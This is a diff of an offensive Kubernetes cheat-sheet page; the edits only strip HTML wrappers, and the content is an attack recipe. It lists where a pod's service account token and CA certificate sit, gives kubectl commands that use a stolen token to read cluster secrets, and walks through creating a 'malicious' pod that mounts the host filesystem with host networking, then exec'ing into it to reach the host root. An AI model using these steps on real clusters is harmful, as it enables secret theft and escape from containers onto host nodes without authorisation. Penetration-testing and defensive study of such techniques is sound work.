@@ -6,27 +6,17 @@ tags: ["Kubernetes", "container", "privesc"]
 
 ### Token Location
 
-<div>
-
 ```console
 /run/secrets/kubernetes.io/serviceaccount/token
 ```
 
-</div>
-
 ### Certificate Location
-
-<div>
 
 ```console
 /run/secrets/kubernetes.io/serviceaccount/ca.crt
 ```
 
-</div>
-
 ### Basic Commands
-
-<div>
 
 ```console
 # List all namespaces
@@ -73,19 +63,13 @@ kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> get sec
 kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> describe secret <SECRET_NAME> -n <NAMESPACE>
 ```
 
-</div>
-
 <small>*Ref: [kubectl](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/)*</small>
-
-<br>
 
 ---
 
 ### Abuse #1: Mount host's file system
 
 #### 1. Create a Malicious YAML (Template)
-
-<div>
 
 ```console
 apiVersion: v1 
@@ -110,21 +94,13 @@ spec:
   hostNetwork: true
 ```
 
-</div>
-
 #### 2. Create a new pod
-
-<div>
 
 ```console
 kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> apply -f test.yaml
 ```
 
-</div>
-
 #### 3. Execute
-
-<div>
 
 ```console
 kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> exec test --stdin --tty -n <NAMESPACE>
@@ -134,7 +110,3 @@ kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> exec te
 # Check host filesystem
 cd /mnt/root/
 ```
-
-</div>
-
-<br>
